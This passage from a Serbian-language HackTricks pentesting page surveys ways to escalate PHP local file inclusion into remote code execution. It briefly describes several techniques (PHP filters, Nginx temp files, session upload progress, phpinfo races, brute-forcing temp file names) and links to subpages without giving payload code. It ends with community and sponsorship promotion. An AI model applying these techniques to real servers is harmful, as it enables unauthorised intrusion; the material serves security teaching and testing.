### Putem php filtera (bez potrebe za datotekom)

Ovaj [**opis**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filtere za generisanje proizvoljnog sadržaja** kao izlaz. Što u osnovi znači da možete **generisati proizvoljni php kod** za uključivanje **bez potrebe da ga pišete** u datoteku.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Putem greške segmentacije

**Otpremite** datoteku koja će biti smeštena kao **privremena** u `/tmp`, zatim u **istom zahtevu,** izazovite **grešku segmentacije**, i onda **privremena datoteka neće biti obrisana** i možete je potražiti.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Putem Nginx privremenog skladištenja datoteka

Ako ste pronašli **Lokalnu Uključenost Datoteke** i **Nginx** je pokrenut ispred PHP-a, možda ćete moći da dobijete RCE pomoću sledeće tehnike:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Putem PHP\_SESSION\_UPLOAD\_PROGRESS

Ako ste pronašli **Lokalnu Uključenost Datoteke** čak i ako **nemate sesiju** i `session.auto_start` je `Isključen`. Ako pružite **`PHP_SESSION_UPLOAD_PROGRESS`** u **multipart POST** podacima, PHP će **omogućiti sesiju za vas**. To biste mogli zloupotrebiti da biste dobili RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Putem privremenih otpremanja datoteka u Windows-u

Ako ste pronašli **Lokalnu Uključenost Datoteke** i server radi na **Windows-u**, možda ćete dobiti RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Putem phpinfo() (file\_uploads = uključeno)

Ako ste pronašli **Lokalnu Uključenost Datoteke** i datoteka izlaže **phpinfo()** sa file\_uploads = uključeno, možete dobiti RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Otkrivanje putanje

Ako ste pronašli **Lokalnu Uključenost Datoteke** i možete **izvući putanju** privremene datoteke ALI **server** proverava da li **datoteka koja se uključuje ima PHP oznake**, možete pokušati da **zaobiđete tu proveru** ovom **Trkačkom Konkurencijom**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Putem večnog čekanja + napada brute force

Ako možete zloupotrebiti LFI da **otpremite privremene datoteke** i naterate server da **zastane** izvršavanje PHP-a, tada biste mogli **napadati imena datoteka satima** da biste pronašli privremenu datoteku:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do Fatalne Greške

Ako uključite bilo koju od datoteka `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Morate uključiti istu datoteku 2 puta da biste izazvali tu grešku).

**Ne znam kako je ovo korisno ali možda jeste.**\
_Čak i ako izazovete PHP Fatalnu Grešku, privremene datoteke koje su otpremljene PHP-om se brišu._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Reference

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u Hakovanje**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o Hakovanju u Realnom Vremenu**\
Budite informisani o brzom svetu hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije Obaveštenje**\
Ostanite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
